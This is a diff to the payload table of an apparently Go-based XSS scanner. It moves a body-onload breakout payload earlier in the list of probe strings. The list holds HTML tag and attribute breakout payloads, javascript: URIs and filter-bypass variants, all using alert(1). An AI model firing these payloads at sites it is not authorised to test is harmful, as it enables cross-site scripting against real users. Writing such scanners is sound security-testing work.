@@ -100,13 +100,14 @@ var payloadTemplates = map[context.ContextType][]PayloadTemplate{
 		{Value: `"><script>alert(1)</script>`, Severity: model.High, Desc: "Tag breakout + script"},
 		{Value: `' onfocus=alert(1) autofocus='`, Severity: model.High, Desc: "Attribute breakout single quote"},
 		{Value: `" style="background:url(javascript:alert(1))`, Severity: model.Medium, Desc: "Style injection"},
+		// Quote breakout + event handler
+		{Value: `"><body onload=alert(1)>`, Severity: model.High, Desc: "Tag breakout + body onload"},
 		// Non-event-handler payloads: bypass on* filters (e.g., onload→o_nload)
 		{Value: `"><svg><script>alert(1)</script>`, Severity: model.High, Desc: "Tag breakout + SVG script (no event handler)"},
 		{Value: `"><iframe srcdoc="<script>alert(1)</script>">`, Severity: model.High, Desc: "Tag breakout + iframe srcdoc"},
 		{Value: `"><a href=javascript:alert(1)>XSS</a>`, Severity: model.Medium, Desc: "Tag breakout + javascript link"},
 		{Value: `"><form action=javascript:alert(1)><button>X</button></form>`, Severity: model.Medium, Desc: "Tag breakout + form action"},
 		{Value: `"><math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>`, Severity: model.High, Desc: "Tag breakout + MathML script"},
-		{Value: `"><body onload=alert(1)>`, Severity: model.High, Desc: "Tag breakout + body onload"},
 	},
 	context.ContextURLAttr: {
 		{Value: `javascript:alert(1)`, Severity: model.High, Desc: "javascript: URI"},
